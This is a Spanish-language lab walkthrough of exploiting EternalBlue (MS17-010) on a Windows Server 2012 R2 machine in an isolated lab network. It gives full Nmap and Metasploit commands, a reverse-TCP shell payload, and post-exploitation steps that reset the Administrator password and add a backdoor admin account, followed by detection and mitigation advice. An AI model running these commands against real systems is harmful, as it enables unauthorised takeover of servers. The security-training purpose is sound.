# Ataque EternalBlue (MS17-010) en Windows Server 2012

## Objetivo

Explotar la vulnerabilidad EternalBlue (CVE-2017-0143) en un servidor Windows Server 2012 utilizando Metasploit Framework desde Kali Linux para obtener acceso remoto y modificar contraseñas del sistema.

---

## Herramientas Utilizadas

- **Sistema Atacante:** Kali Linux (10.10.0.101)
- **Sistema Víctima:** Windows Server 2012 R2 (10.10.0.20)
- **Herramientas:** Nmap, Metasploit Framework
- **Red:** 10.10.0.0/24 (vmbr1 en Proxmox)

---

## Conceptos Previos

### ¿Qué es EternalBlue?

- **Exploit** desarrollado por la NSA
- **Filtrado** por The Shadow Brokers en abril de 2017
- **Protocolo afectado:** SMBv1 (puerto 445)
- **CVE:** CVE-2017-0143
- **Impacto:** Ejecución remota de código sin autenticación

### Sistemas Afectados

- Windows 7 / Windows Vista
- Windows Server 2008 / 2008 R2
- **Windows Server 2012 / 2012 R2** ← Objetivo de este lab
- Windows 8.1
- Windows 10 (versiones pre-marzo 2017)

### Ataques Famosos que Usaron EternalBlue

- **WannaCry** (mayo 2017): Ransomware global
- **NotPetya** (junio 2017): Ataque destructivo

---

## Parte 1: Reconocimiento

### Paso 1: Verificar conectividad
```bash
ping 10.10.0.20 -c 4
```

### Paso 2: Escanear puertos SMB
```bash
nmap -p 445,139,135 10.10.0.20
```

**Resultado esperado:**
```
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```

---

### Paso 3: Detectar versión de SMB
```bash
nmap -sV -p 445 10.10.0.20
```

**Resultado esperado:**
```
445/tcp open  microsoft-ds Microsoft Windows Server 2012 R2 microsoft-ds
```

---

### Paso 4: Verificar vulnerabilidad MS17-010
```bash
nmap --script smb-vuln-ms17-010 -p 445 10.10.0.20
```

**Resultado esperado:**
```
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
```

🎯 **Confirmación:** El servidor es VULNERABLE

---

## Parte 2: Explotación con Metasploit

### Paso 1: Iniciar Metasploit
```bash
msfconsole
```

---

### Paso 2: Buscar el exploit
```bash
search ms17-010
```

**Salida:**
```
0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14  average  Yes
```

---

### Paso 3: Seleccionar el exploit
```bash
use exploit/windows/smb/ms17_010_eternalblue
```

---

### Paso 4: Configurar parámetros
```bash
# Configurar IP de la víctima
set RHOSTS 10.10.0.20

# Configurar IP del atacante
set LHOST 10.10.0.101

# Configurar payload
set payload windows/x64/shell/reverse_tcp
```

---

### Paso 5: Verificar configuración
```bash
show options
```

**Verificar que estén configurados:**
- RHOSTS = 10.10.0.20
- LHOST = 10.10.0.101
- Payload = windows/x64/shell/reverse_tcp

---

### Paso 6: Ejecutar el exploit
```bash
exploit
```


## Parte 3: Post-Explotación

### Paso 1: Verificar usuario actual
```cmd
whoami
```

**Resultado esperado:**
```
nt authority\system
```

**NT AUTHORITY\SYSTEM** = Máximos privilegios

---

### Paso 2: Verificar información del sistema
```cmd
ipconfig
```

**Resultado esperado:**
```
IPv4 Address. . . . . . . . . . . : 10.10.0.20
Subnet Mask . . . . . . . . . . . : 255.255.255.0
```

---

### Paso 3: Listar usuarios existentes
```cmd
net user
```

**Resultado esperado:**
```
Administrator            Guest
```

---

### Paso 4: Cambiar contraseña del Administrador
```cmd
net user Administrator NuevaContraseña123!
```

**Resultado:**
```
The command completed successfully.
```

✅ Contraseña cambiada exitosamente

**Variantes del comando:**

Si el usuario está en español:
```cmd
net user Administrador NuevaContraseña123!
```

Para establecer contraseña de forma interactiva:
```cmd
net user Administrator *
```

---

### Paso 5: Crear un nuevo usuario
```cmd
net user hacker P@ssw0rd123! /add
```

**Resultado:**
```
The command completed successfully.
```

---

### Paso 6: Verificar usuario creado
```cmd
net user hacker
```

**Resultado esperado:**
```
User name                    hacker
Account active               Yes
Password expires             Never
Local Group Memberships      *Users
```

---

### Paso 7: Agregar usuario a Administradores
```cmd
net localgroup Administrators hacker /add
```

**Resultado:**
```
The command completed successfully.
```

---

### Paso 8: Verificar grupo de Administradores
```cmd
net localgroup Administrators
```

**Resultado esperado:**
```
Members
-------------------------------------------------------------------------------
Administrator
hacker
```

✅ Usuario `hacker` ahora tiene privilegios de administrador

---

## Tabla Resumen del Ataque

| Fase | Comando | Resultado |
|------|---------|-----------|
| **Reconocimiento** | `nmap --script smb-vuln-ms17-010 -p 445 10.10.0.20` | Vulnerabilidad confirmada |
| **Explotación** | `use exploit/windows/smb/ms17_010_eternalblue` | Shell con privilegios SYSTEM |
| **Cambio de contraseña** | `net user Administrator NuevaContraseña123!` | Contraseña modificada |
| **Creación de usuario** | `net user hacker P@ssw0rd123! /add` | Usuario creado |
| **Elevación de privilegios** | `net localgroup Administrators hacker /add` | Usuario con privilegios admin |

---

## Algoritmos de Hashing en Windows vs Linux

| Sistema | Algoritmo | Ubicación |
|---------|-----------|-----------|
| **Linux** | SHA-256/SHA-512 + salt | `/etc/shadow` |
| **Windows** | NTLM Hash | `SAM Database` |

> **Nota:** En Windows, las contraseñas se hashean con NTLM y se almacenan en la base de datos SAM.

---

## Detección del Ataque

### Eventos de Windows a Monitorear

| Event ID | Descripción |
|----------|-------------|
| **4624** | Inicio de sesión exitoso |
| **4720** | Usuario creado |
| **4732** | Usuario agregado a grupo de seguridad |

**Ubicación:** Event Viewer > Windows Logs > Security

---

## Mitigación

### ✅ Aplicar parches de seguridad
```powershell
Install-WindowsUpdate -AcceptAll -AutoReboot
```

### ✅ Deshabilitar SMBv1
```powershell
Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol
```

### ✅ Verificar que SMBv1 está deshabilitado
```powershell
Get-WindowsOptionalFeature -Online -FeatureName SMB1Protocol
```

### ✅ Bloquear puerto 445 en firewall
```powershell
New-NetFirewallRule -DisplayName "Block SMB" -Direction Inbound -LocalPort 445 -Protocol TCP -Action Block
```

---

## Comandos Rápidos de Referencia

### Reconocimiento
```bash
ping 10.10.0.20 -c 4
nmap --script smb-vuln-ms17-010 -p 445 10.10.0.20
```

### Explotación
```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.0.20
set LHOST 10.10.0.101
set payload windows/x64/shell/reverse_tcp
exploit
```

### Post-Explotación
```cmd
whoami
net user Administrator NuevaContraseña123!
net user hacker P@ssw0rd123! /add
net localgroup Administrators hacker /add
```

---

## Conclusiones

Este laboratorio demostró cómo:

- ✅ **Identificar** sistemas vulnerables a EternalBlue con Nmap
- ✅ **Explotar** la vulnerabilidad MS17-010 con Metasploit
- ✅ **Obtener** privilegios SYSTEM en Windows Server 2012
- ✅ **Modificar** contraseñas del administrador
- ✅ **Crear** usuarios con privilegios administrativos

### Lecciones Clave

1. **Mantener sistemas actualizados** es crítico
2. **Deshabilitar SMBv1** si no es necesario
3. **Monitorear** logs de seguridad constantemente
4. **Segmentar** la red para limitar impacto de brechas
